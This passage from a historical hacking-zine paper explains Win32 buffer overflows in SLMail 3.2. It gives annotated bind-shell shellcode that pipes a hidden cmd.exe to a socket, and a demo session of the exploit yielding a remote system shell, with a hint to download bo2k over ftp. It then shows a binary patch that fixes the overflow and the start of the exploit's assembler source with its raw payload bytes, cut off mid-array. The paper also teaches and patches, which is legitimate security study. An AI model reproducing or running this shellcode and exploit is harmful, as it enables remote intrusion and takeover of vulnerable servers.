+:0000017B 75F9                    jne 00000176
+:0000017D B310                    mov bl, 10
+:0000017F 56                      push esi
+:00000180 FF13                    call dword ptr [ebx]
+:00000182 8BD0                    mov edx, eax
+:00000184 FC                      cld
+:00000185 33C9                    xor ecx, ecx
+:00000187 B106                    mov cl, 06
+:00000189 32C0                    xor al, al
+:0000018B AC                      lodsb
+:0000018C 84C0                    test al, al
+:0000018E 75F9                    jne 00000189
+:00000190 52                      push edx
+:00000191 51                      push ecx
+:00000192 56                      push esi
+:00000193 52                      push edx
+:00000194 B30C                    mov bl, 0C
+:00000196 FF13                    call dword ptr [ebx]
+:00000198 AB                      stosd
+:00000199 59                      pop ecx
+:0000019A 5A                      pop edx
+:0000019B E2EC                    loop 00000189
+
+
+This is just a repeat of the earlier code, except now we are extending our
+jump table to include the socket functions.
+
+
+:0000019D 83C605                  add esi, 00000005
+:000001A0 33C0                    xor eax, eax
+:000001A2 50                      push eax
+:000001A3 40                      inc eax
+:000001A4 50                      push eax
+:000001A5 40                      inc eax
+:000001A6 50                      push eax
+:000001A7 FF57E8                  call [edi-18]
+:000001AA 93                      xchg eax,ebx
+
+
+Here we push the values SOCK_STREAM, AF_INET, and null for the protocol.  We
+then call the 'socket' function.
+
+Note: We don't need to call WSAStartup as the target process has taken care of
+that for us
+
+We also set esi to point to the socket structure, and we store the return
+value from the socket procedure in ebx so it won't be destroyed by following
+functions.
+
+
+:000001AB 6A10                    push 00000010
+:000001AD 56                      push esi
+:000001AE 53                      push ebx
+:000001AF FF57EC                  call [edi-14]
+
+
+This just makes a call to bind, pushing our socket handle and the socket
+structure as parameters.
+
+
+:000001B2 6A02                    push 00000002
+:000001B4 53                      push ebx
+:000001B5 FF57F0                  call [edi-10]
+
+
+Now we call listen, socket handle as the parameter.
+
+
+:000001B8 33C0                    xor eax, eax
+:000001BA 57                      push edi
+:000001BB 50                      push eax
+:000001BC B00C                    mov al, 0C
+:000001BE AB                      stosd
+:000001BF 58                      pop eax
+:000001C0 AB                      stosd
+:000001C1 40                      inc eax
+:000001C2 AB                      stosd
+:000001C3 5F                      pop edi
+:000001C4 48                      dec eax
+:000001C5 50                      push eax
+:000001C6 57                      push edi
+:000001C7 56                      push esi
+:000001C8 AD                      lodsd
+:000001C9 56                      push esi
+:000001CA FF57C0                  call [edi-40]
+
+
+Now we make our first call to CreatePipe, we create our SECURITY_ATTRIBUTES
+structure at edi, and specify that the returned handles are inheritable.  esi
+receives our read and write handles returned from the call.
+
+
+:000001CD 48                      dec eax
+:000001CE 50                      push eax
+:000001CF 57                      push edi
+:000001D0 AD                      lodsd
+:000001D1 56                      push esi
+:000001D2 AD                      lodsd
+:000001D3 56                      push esi
+:000001D4 FF57C0                  call [edi-40]
+
+
+Our second call to CreatePipe, again our read and write handles are stored at
+esi.
+
+
+:000001D7 48                      dec eax
+:000001D8 B044                    mov al, 44
+:000001DA 8907                    mov dword ptr [edi], eax
+:000001DC 57                      push edi
+:000001DD FF57C4                  call [edi-3C]
+
+
+We make a call to GetStartupInfo, the structure will be stored at edi which we
+give the size value.  The structure will need to be modified.
+
+
+:000001E0 33C0                    xor eax, eax
+:000001E2 8B46F4                  mov eax, dword ptr [esi-0C]
+:000001E5 89473C                  mov dword ptr [edi+3C], eax
+:000001E8 894740                  mov dword ptr [edi+40], eax
+:000001EB 8B06                    mov eax, dword ptr [esi]
+:000001ED 894738                  mov dword ptr [edi+38], eax
+:000001F0 33C0                    xor eax, eax
+:000001F2 66B80101                mov ax, 0101
+:000001F6 89472C                  mov dword ptr [edi+2C], eax
+:000001F9 57                      push edi
+:000001FA 57                      push edi
+:000001FB 33C0                    xor eax, eax
+:000001FD 50                      push eax
+:000001FE 50                      push eax
+:000001FF 50                      push eax
+:00000200 40                      inc eax
+:00000201 50                      push eax
+:00000202 48                      dec eax
+:00000203 50                      push eax
+:00000204 50                      push eax
+:00000205 AD                      lodsd
+:00000206 56                      push esi
+:00000207 33C0                    xor eax, eax
+:00000209 50                      push eax
+:0000020A FF57C8                  call [edi-38]
+
+
+By all means feel free to improve this code to drop some bytes, for example,
+using stosd to modify edi. At the time I was just trying to make it _work_,
+and wasn't particularly worried about the size.  What the hell is going on
+here anyway?
+
+We are modifying the startupinfo structure before our call to CreateProcess.
+
+We replace StdOutput and StdError with the handle of the write end of our
+first created pipe.  We then replace StdInput with the read handle of our
+second created pipe.  The flags value we set to
+STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES, and we set the ShowWindow value
+to SW_HIDE.  esi points to "cmd.exe" and we make the call to CreateProcess.
+
+
+:0000020D FF76F0                  push [esi-10]
+:00000210 FF57CC                  call [edi-34]
+:00000213 FF76FC                  push [esi-04]
+:00000216 FF57CC                  call [edi-34]
+
+
+CloseHandle is called to close the first read and the second write handles we
+used for our StdHandles.
+
+
+:00000219 48                      dec eax
+:0000021A 50                      push eax
+:0000021B 50                      push eax
+:0000021C 53                      push ebx
+:0000021D FF57F4                  call [edi-0C]
+:00000220 8BD8                    mov ebx, eax
+
+
+Now we call accept and wait for a connection.  We store the returned handle in
+ebx.
+
+
+:00000222 33C0                    xor eax, eax
+:00000224 B404                    mov ah, 04
+:00000226 50                      push eax
+:00000227 C1E804                  shr eax, 04
+:0000022A 50                      push eax
+:0000022B FF57D4                  call [edi-2C]
+:0000022E 8BF0                    mov esi, eax
+
+
+Here we create a 1024 byte buffer with GlobalAlloc, pushing
+GMEM_FIXED+GMEM_ZEROINIT which will return a handle that we place in esi.
+
+
+:00000230 33C0                    xor eax, eax
+:00000232 8BC8                    mov ecx, eax
+:00000234 B504                    mov ch, 04
+:00000236 50                      push eax
+:00000237 50                      push eax
+:00000238 57                      push edi
+:00000239 51                      push ecx
+:0000023A 50                      push eax
+:0000023B FF77A8                  push [edi-58]
+:0000023E FF57D0                  call [edi-30]
+:00000241 833F01                  cmp dword ptr [edi], 00000001
+:00000244 7C22                    jl 00000268
+
+
+Now we start to get to the guts, this makes a call to PeekNamedPipe to see if
+we have any data in the read end of the pipe (StdOutput/StdError), if not we
+skip the following readfile/send functions as we are waiting on input from
+the user.  edi stores the number of bytes read, [edi-58] is the handle to the
+read end of the pipe.
+
+
+:00000246 33C0                    xor eax, eax
+:00000248 50                      push eax
+:00000249 57                      push edi
+:0000024A FF37                    push dword ptr [edi]
+:0000024C 56                      push esi
+:0000024D FF77A8                  push [edi-58]
+:00000250 FF57DC                  call [edi-24]
+:00000253 0BC0                    or eax, eax
+:00000255 742F                    je 00000286
+
+
+We call ReadFile and fill our created buffer with the data from the read-end
+of the pipe, we push the bytesread parameter from our earlier call to
+PeekNamedPipe.  If the function fails, i.e.: the command prompt was exited
+- then we jump to the end of our shellcode and call ExitProcess, which will
+kill the slmail process.
+
+:00000257 33C0                    xor eax, eax
+:00000259 50                      push eax
+:0000025A FF37                    push dword ptr [edi]
+:0000025C 56                      push esi
+:0000025D 53                      push ebx
+:0000025E FF57F8                  call [edi-08]
+
+Now we call send to fire the data from our buffer off to the connected user.
+
+
+:00000261 6A50                    push 00000050
+:00000263 FF57E0                  call [edi-20]
+:00000266 EBC8                    jmp 00000230
+
+
+Call Sleep and jump back to PeekNamedPipe.
+
+
+:00000268 33C0                    xor eax, eax
+:0000026A 50                      push eax
+:0000026B B404                    mov ah, 04
+:0000026D 50                      push eax
+:0000026E 56                      push esi
+:0000026F 53                      push ebx
+:00000270 FF57FC                  call [edi-04]
+
+
+This is the point we get to if there was no data in the read pipe, so we call
+recv and receive input from the user.
+
+
+:00000273 57                      push edi
+:00000274 33C9                    xor ecx, ecx
+:00000276 51                      push ecx
+:00000277 50                      push eax
+:00000278 56                      push esi
+:00000279 FF77AC                  push [edi-54]
+:0000027C FF57D8                  call [edi-28]
+
+
+We push the handle of the write end of our pipe (StdInput), and we call
+WriteFile sending the buffer from the user.  i.e.: we make it happen.
+
+
+:0000027F 6A50                    push 00000050
+:00000281 FF57E0                  call [edi-20]
+:00000284 EBAA                    jmp 00000230
+
+
+Call Sleep again and jump back to PeekNamedPipe.
+
+
+:00000286 50                      push eax
+:00000287 FF57E4                  call [edi-1C]
+:0000028A 90                      nop
+
+
+The shell has been exited so we call ExitProcess to clean up our mess.
+
+And there we have it, full control is at our fingertips.
+
+Before we enter the last section, on modifying the executable of our
+target, I'll give a quick example of the exploit in action.
+
+
+Ownership.
+~~~~~~~~~~
+
+E:\exploits>slxploit supermax.gen.nz 8376 1234
+SLMail (3.2.3113) remote.
+by Barnaby Jack AKA dark spyrit <dspyrit@beavuh.org>
+
+usage: slxploit <host> <port> <port to bind shell>
+e.g. - slxploit host.com 27 1234
+
+waiting for response....
+220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
+
+sent.. spawn connection now.
+
+
+Trying 192.168.10.3...
+Connected to supermax.gen.nz.
+Escape character is '^]'.
+Microsoft(R) Windows NT(TM)
+(C) Copyright 1985-1996 Microsoft Corp.
+
+E:\Program Files\SLmail\SYSTEM>
+E:\Program Files\SLmail\SYSTEM>at
+The service has not been started.
+
+E:\Program Files\SLmail\SYSTEM>net start schedule
+
+The Schedule service is starting.
+The Schedule service was started successfully.
+
+E:\Program Files\SLmail\SYSTEM>time
+The current time is: 23:49:36.36
+Enter the new time:
+
+E:\Program Files\SLmail\SYSTEM>at 23:51:00 net start slmail
+Added a new job with job ID = 0
+
+E:\Program Files\SLmail\SYSTEM>net view
+Server Name            Remark
+
+-------------------------------------------------------------------------------
+\\SUPERMAX
+The command completed successfully.
+
+E:\Program Files\SLmail\SYSTEM>net send supermax beavuh 99.
+The message was successfully sent to SUPERMAX.
+
+
+E:\Program Files\SLmail\SYSTEM>exit
+exit
+Connection closed by foreign host.
+
+Plenty of options, you could also create a file with ftp commands, to
+download bo2k for example, and use NT's console ftp.
+e.g. ftp -s:file host.
+
+
+Section 3: The Remedy.
+~~~~~~~~~~~~~~~~~~~~~~
+
+This is perhaps the most important section of the paper, and is not just
+useful for preventing vulnerabilities - the ability to add your own code
+leaves open an endless amount of possibilities as you can imagine.
+
+I advise that you have a look at some documentation on the PE file format,
+Matt Peitreks book "Windows 95 System Programming Secrets" has an excellent
+section, otherwise take a look at
+http://msdn.microsoft.com/library/specs/msdn_pecoff.htm for Microsoft's
+documentation.
+
+Consider this hypothetical situation for a minute:
+
+A huge hole is found rendering most NT servers on the internet vulnerable
+to remote system access.  Microsoft stumbles around for a week or so before
+releasing a suitable patch, while during this time some of the largest
+corporations have little to do but pray they won't fall victim to an attack,
+or make the change to alternative software.  Hey, that happened a couple of
+months ago! :)  But there is an alternative, patch the software yourself.
+
+There are 3 main approaches we can take to add our own code.
+
+1, Add our code to unused space in a section.
+2, Increase the size of the last section.
+3, Add a new section.
+
+The first is the technique we will use, to see an example of the second
+approach have a look at my trojan netstat which will be available at
+http://www.rootkit.com in the near future.
+
+Adding your own section - at least as far as what we are doing, won't
+normally be needed, so I won't cover the techniques in this document.
+
+Now we need to think about the code we will add, here's a few options:
+
+Add our own string length routine, and print out an error message
+depending on the length.. then skip the nasty functions.
+
+Add our own string length routine, and place a null at the beginning of
+the buffer depending on the length, so effectively the program thinks
+there was no input and will return a standard 'syntax error' message.
+
+Replace the offending strcpy function with a bounds checking version - i.e.:
+do what they should have done in the first place.
+
+I think it's obvious the approach we will take, the first option would be
+too involved, the second just isn't delicate - so we'll go with the last.
+
+It just so happens that in this case lstrcpynA is in our targets import
+table (if this wasn't the case? we would use the same techniques as shown
+in the shellcode - using the LoadLibrary and GetProcAddress procedures).
+
+Grab PE Dump or dumpbin, whatever you have on you.. and dump the section
+table for slmail.exe, if you haven't worked with the PE header before I'll
+explain a little as we go.
+
+
+Section Table
+  01 .text     VirtSize: 0003F99B  VirtAddr:  00001000
+    raw data offs:   00001000  raw data size: 00040000
+    relocation offs: 00000000  relocations:   00000000
+    line # offs:     00000000  line #'s:      00000000
+    characteristics: 60000020
+      CODE  MEM_EXECUTE  MEM_READ
+
+
+The section we will be working with is the .text section - where the code
+is located.  We can see here that the Virtual Size (the actual size of the
+code) is somewhat smaller than the raw data size (the amount of space that is
+actually taken up).  So if we subtract the Virtual Size from the raw data
+size :
+
+0x40000 - 0x3f99b = 0x665
+
+That gives us about 1.6k to play with, easily enough space for what we want to
+do.
+
+Why do we have this extra space? 
+
+Because compilers usually round up the size to align the section, which is
+handy for us :)
+
+Fire up your hex editor, and jump to the address 0x4099b (virtual size +
+raw data offset) and you'll notice we have a ton of null bytes, about 1.6k
+worth in fact.  This is a perfect place to dump our code - but before we do..
+
+We need to increase the Virtual Size to allow for our code, we may as well
+increase it to the largest available size, it won't hurt.  We also need to
+modify the flags, as you saw from the dump the .text section is defined code,
+readable and executable.
+
+The values are as follows:
+
+
+IMAGE_SCN_CNT_CODE	equ       000000020h  
+IMAGE_SCN_MEM_EXECUTE	equ       020000000h  
+IMAGE_SCN_MEM_READ      equ       040000000h 
+
+
+To get the final value we OR each of the flags, which results in 060000020h.
+
+But, if we wish to write data to our code space, to avoid page faults we also
+need to make the section writeable - we may not have the need, but it doesn't
+hurt to change the flags anyway.
+
+
+IMAGE_SCN_MEM_WRITE     equ       080000000h
+
+
+So we OR this value with 060000020h and we get 0E0000020h.  This is the new
+value we will add to the exe.
+ 
+Jump back into the hex editor and we'll make these changes permanent, to find
+the Virtual Size value for the .text section, simply do a search for .text
+and the following value is the culprit.
+
+
+000001D0  00 00 00 00 00 00 00 00-2E 74 65 78 74 00 00 00   .........text...
+000001E0  9B F9 03 00  <====                                ....
+
+
+To set this to the maximum allowed value we just replace with the raw data
+size:
+
+
+000001E0  00 00 04 00 
+
+
+And, we also make the change to the flags.
+
+
+000001D0  00 00 00 00 00 00 00 00-2E 74 65 78 74 00 00 00   .........text...
+000001E0  9B F9 03 00 00 10 00 00-00 00 04 00 00 10 00 00   ................
+000001F0  00 00 00 00 00 00 00 00-00 00 00 00 20 00 00 60   <=====
+
+
+We replace with our new value that allows us to write to the code space:
+
+
+000001F0  00 00 00 00 00 00 00 00-00 00 00 00 20 00 00 E0
+
+
+We'll quickly verify our changes with PE Dump, then we can actually get to
+what we're here for, getting our code executing.
+
+
+Section Table
+  01 .text     VirtSize: 00040000  VirtAddr:  00001000
+    raw data offs:   00001000  raw data size: 00040000
+    relocation offs: 00000000  relocations:   00000000
+    line # offs:     00000000  line #'s:      00000000
+    characteristics: E0000020
+      CODE  MEM_EXECUTE  MEM_READ  MEM_WRITE
+
+
+And there we have it, our virtual size equals the raw data size, and we now
+also have the writeable flag.
+
+What we need to do now, is find a location to jump to our own code. 
+
+
+004364AE                 push    edi
+004364AF                 push    eax ; we jump here.
+004364B0                 push    esi
+004364B1                 call    ds:lstrcpyA
+
+
+We'll get rid of the strcpy call, and make a jump to our code at the 'push
+eax'.  We know our code resides at RVA (relative virtual address) 0x4099b
+so we make our jump.  We can assemble our jumps in tasm:
+
+jmp $+(04099bh-0364afh)
+
+(RVA of our code - RVA of current location)
+
+Or, we can do it straight from the debugger.
+
+
+Let's make it perm.. the code follows:
+
+
+:004364AA 8B742478                mov esi, dword ptr [esp+78]
+:004364AE 57                      push edi
+:004364AF E9E7A40000              jmp 0044099B     ;jump to our code
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:004409A9(U)
+|
+:004364B4 59                      pop ecx          ;restore ecx on return
+:004364B5 90                      nop
+:004364B6 90                      nop
+
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:004364AF(U)
+|
+:0044099B 51                      push ecx          ;preserve ecx
+:0044099C 52                      push edx          ;preserve edx
+:0044099D E800000000              call 004409A2
+
+* Referenced by a CALL at Address:
+|:0044099D   
+|
+:004409A2 5A                      pop edx           ;get eip
+:004409A3 81EAA2090400            sub edx, 000409A2 ;get image base
+:004409A9 81C264110400            add edx, 00041164 ;point to strcpyn
+:004409AF 33C9                    xor ecx, ecx
+:004409B1 B160                    mov cl, 60        ;allow 96 bytes 
+:004409B3 51                      push ecx
+:004409B4 50                      push eax          ;our input
+:004409B5 56                      push esi          ;buffer 
+:004409B6 FF12                    call dword ptr [edx]  ;call strcpyn 
+:004409B8 5A                      pop edx             ;restore edx
+:004409B9 E9F65AFFFF              jmp 004364B4        ;back to proggie.
+
+Yeah, I know, W32Dasm - but hey, its fast and easy for showing code dumps
+:)
+
+The stack pointer is basically kept in tact, so we don't need to worry about
+screwing with it.
+
+Now, this should have solved our problem - let's check.
+
+220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
+expn <10 or so lines of x's>
+
+Connection closed by foreign host.
+
+Whoops, the slmail process dies.
+
+Guess what? there's another overflow.  This software is shocking, widely
+used shocking software might I add.  Well, let us fix this one also.
+
+A couple of rets, and we quickly find the offending code:
+
+
+00404bb1	mov	esi, eax
+00404bb3	push	edi	
+00404bb4	push	ecx	
+00404bb5	call	[KERNEL32!lstrcpy]
+
+
+edi contains our input, ecx the buffer.
+
+Here we go again.
+
+We'll put our code directly after our earlier modifications (0x409be), and
+we'll kill this strcpy call and jump to our code at 'push edi'.
+
+
+:00404BB1 8BF0                    mov esi, eax
+:00404BB3 E906BE0300              jmp 004409BE  ;jump to our code
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:004409E0(U)
+|
+:00404BB8 90                      nop
+:00404BB9 90                      nop
+:00404BBA 90                      nop
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:00404BB3(U)
+|
+:004409BE 90                      nop
+:004409BF 52                      push edx        ;preserve edx
+:004409C0 E800000000              call 004409C5
+
+* Referenced by a CALL at Address:
+|:004409C0   
+|
+:004409C5 5A                      pop edx	     ;get eip
+:004409C6 81EAC5090400            sub edx, 000409C5  ;get image base
+:004409CC 81C264110400            add edx, 00041164  ;address for strcpyn
+:004409D2 33C0                    xor eax, eax
+:004409D4 B060                    mov al, 60         ;allow 96 byes
+:004409D6 50                      push eax 
+:004409D7 57                      push edi           ;input
+:004409D8 51                      push ecx           ;buffer
+:004409D9 FF12                    call dword ptr [edx]  ;call strcpyn
+:004409DB 5A                      pop edx 		;restore edx
+:004409DC C6476000                mov [edi+60], 00	;cut the goddamn
+                                                        ;input short,
+                                                        ;incase there is 
+                                                        ;even more overflows 
+:004409E0 E9D341FCFF              jmp 00404BB8 ;return to the prog.
+
+
+This time...
+
+220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
+expn xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxx
+550 Unable to find list 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.
+quit
+221 supermax.gen.nz Service Closing
+Connection closed by foreign host.
+
+
+And so it was done, 15 minutes work and we've fixed a terribly serious hole.
+
+No source? no problem.
+
+The binary for this quick patch will be available at http://www.beavuh.org, 
+although, a vendor patch is seriously recommended.
+
+This will prevent break-ins from the exploit that accompanies this paper,
+but there are far too many exploitable holes in this software - and no
+doubt after reading this other exploits are in the works.
+
+
+Conclusion.
+~~~~~~~~~~~
+
+Windows 9x/NT has a had a relatively easy ride as far as buffer overflows go -
+a change is coming.  Although some "big" software has been affected as of
+late, the limitations of the payload and the system dependency limited the
+wide-scale fear.
+
+It's time to recognize.
+
+The fact that I picked on 3rd party software for this article, rather than
+hitting the giant itself, is not because of lack of opportunities - trust
+me, there is a lot hiding behind the bloat.
+
+Navigate the code, work those registers, and you'll come up trumps -
+guaranteed.
+
+Fight those who try to outlaw our methods, support the open source
+movement, and support full disclosure - it is a good thing.
+
+
+"One future.  Two choices.  Oppose them or let them destroy us."
+
+-Propagandhi.
+
+
+Greets and thanks.
+~~~~~~~~~~~~~~~~~~
+
+neophyte, Greg Hoglund, c33, sacX, tree, casper, ripper, ryan, luny,
+sycotic, blitz, marc, Interrupt, ambient empire, DilDog, the beavuh &
+mulysa crew, the eEye team, the rootkit crew, attrition, w00w00, L0pht,
+ADM, Phrack, Security Focus, technotronic, HNN, Packet Storm Security.. 
+and everyone else I forgot.
+
+
+The Code.
+~~~~~~~~~
+
+The assembler source code follows, and the shellcode for the exploit in c
+format if anyone wishes to port.
+
+<++> P55/Win32-overflows/slxploit.asm !e7b4ebd0
+;-------(code)-------------------------------------------------------------
+
+; This is just a shell from an old exploit of mine, so the code is somewhat 
+; dodgy - and no real error checking.
+; Live with it.
+;
+; The binary is available at http://www.beavuh.org.
+;
+; To assemble:
+;
+; tasm32 -ml slxploit.asm
+; tlink32 -Tpe -c -x sxlploit.obj ,,, import32
+;
+; TASM 5 required!
+;
+; dark spyrit / barnaby jack <dspyrit@beavuh.org>
+
+
+.386p
+locals
+jumps
+.model flat, stdcall
+
+
+extrn GetCommandLineA:PROC
+extrn GetStdHandle:PROC
+extrn WriteConsoleA:PROC
+extrn ExitProcess:PROC
+extrn WSAStartup:PROC
+extrn connect:PROC
+extrn send:PROC
+extrn recv:PROC
+extrn WSACleanup:PROC
+extrn gethostbyname:PROC
+extrn htons:PROC
+extrn socket:PROC
+extrn inet_addr:PROC
+extrn closesocket:PROC
+
+.data
+sploit_length           equ     851
+
+sploit:
+ db 065h, 078h, 070h, 06eh, 020h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+ db 090h, 090h, 0ebh, 007h, 090h, 0aah, 01ch, 09ch, 077h, 090h, 090h, 090h
+ db 033h, 0c0h, 050h, 0f7h, 0d0h, 050h, 059h, 0f2h, 0afh, 059h, 0b1h, 0c6h
+ db 08bh, 0c7h, 048h, 080h, 030h, 099h, 0e2h, 0fah, 033h, 0f6h, 096h, 0bbh
+ db 099h, 010h, 011h, 044h, 0c1h, 0ebh, 008h, 056h, 0ffh, 013h, 08bh, 0d0h
+ db 0fch, 033h, 0c9h, 0b1h, 00bh, 049h, 032h, 0c0h, 0ach, 084h, 0c0h, 075h
+ db 0f9h, 052h, 051h, 056h, 052h, 0b3h, 00ch, 0ffh, 013h, 0abh, 059h, 05ah
+ db 0e2h, 0ech, 032h, 0c0h, 0ach, 084h, 0c0h, 075h, 0f9h, 0b3h, 010h, 056h
+ db 0ffh, 013h, 08bh, 0d0h, 0fch, 033h, 0c9h, 0b1h, 006h, 032h, 0c0h, 0ach
+ db 084h, 0c0h, 075h, 0f9h, 052h, 051h, 056h, 052h, 0b3h, 00ch, 0ffh, 013h
+ db 0abh, 059h, 05ah, 0e2h, 0ech, 083h, 0c6h, 005h, 033h, 0c0h, 050h, 040h
+ db 050h, 040h, 050h, 0ffh, 057h, 0e8h, 093h, 06ah, 010h, 056h, 053h, 0ffh
+ db 057h, 0ech, 06ah, 002h, 053h, 0ffh, 057h, 0f0h, 033h, 0c0h, 057h, 050h
+ db 0b0h, 00ch, 0abh, 058h, 0abh, 040h, 0abh, 05fh, 048h, 050h, 057h, 056h
+ db 0adh, 056h, 0ffh, 057h, 0c0h, 048h, 050h, 057h, 0adh, 056h, 0adh, 056h
+ db 0ffh, 057h, 0c0h, 048h, 0b0h, 044h, 089h, 007h, 057h, 0ffh, 057h, 0c4h
+ db 033h, 0c0h, 08bh, 046h, 0f4h, 089h, 047h, 03ch, 089h, 047h, 040h, 08bh
+ db 006h, 089h, 047h, 038h, 033h, 0c0h, 066h, 0b8h, 001h, 001h, 089h, 047h
+ db 02ch, 057h, 057h, 033h, 0c0h, 050h, 050h, 050h, 040h, 050h, 048h, 050h
+ db 050h, 0adh, 056h, 033h, 0c0h, 050h, 0ffh, 057h, 0c8h, 0ffh, 076h, 0f0h
+ db 0ffh, 057h, 0cch, 0ffh, 076h, 0fch, 0ffh, 057h, 0cch, 048h, 050h, 050h
+ db 053h, 0ffh, 057h, 0f4h, 08bh, 0d8h, 033h, 0c0h, 0b4h, 004h, 050h, 0c1h
+ db 0e8h, 004h, 050h, 0ffh, 057h, 0d4h, 08bh, 0f0h, 033h, 0c0h, 08bh, 0c8h
+ db 0b5h, 004h, 050h, 050h, 057h, 051h, 050h, 0ffh, 077h, 0a8h, 0ffh, 057h
+ db 0d0h, 083h, 03fh, 001h, 07ch, 022h, 033h, 0c0h, 050h, 057h, 0ffh, 037h
+ db 056h, 0ffh, 077h, 0a8h, 0ffh, 057h, 0dch, 00bh, 0c0h, 074h, 02fh, 033h
+ db 0c0h, 050h, 0ffh, 037h, 056h, 053h, 0ffh, 057h, 0f8h, 06ah, 050h, 0ffh
+ db 057h, 0e0h, 0ebh, 0c8h, 033h, 0c0h, 050h, 0b4h, 004h, 050h, 056h, 053h
+ db 0ffh, 057h, 0fch, 057h, 033h, 0c9h, 051h, 050h, 056h, 0ffh, 077h, 0ach
+ db 0ffh, 057h, 0d8h, 06ah, 050h, 0ffh, 057h, 0e0h, 0ebh, 0aah, 050h, 0ffh
+ db 057h, 0e4h, 090h, 0d2h, 0dch, 0cbh, 0d7h, 0dch, 0d5h, 0aah, 0abh, 099h
+ db 0dah, 0ebh, 0fch, 0f8h, 0edh, 0fch, 0c9h, 0f0h, 0e9h, 0fch, 099h, 0deh
+ db 0fch, 0edh, 0cah, 0edh, 0f8h, 0ebh, 0edh, 0ech, 0e9h, 0d0h, 0f7h, 0ffh
+ db 0f6h, 0d8h, 099h, 0dah, 0ebh, 0fch, 0f8h, 0edh, 0fch, 0c9h, 0ebh, 0f6h
+ db 0fah, 0fch, 0eah, 0eah, 0d8h, 099h, 0dah, 0f5h, 0f6h, 0eah, 0fch, 0d1h
+ db 0f8h, 0f7h, 0fdh, 0f5h, 0fch, 099h, 0c9h, 0fch, 0fch, 0f2h, 0d7h, 0f8h
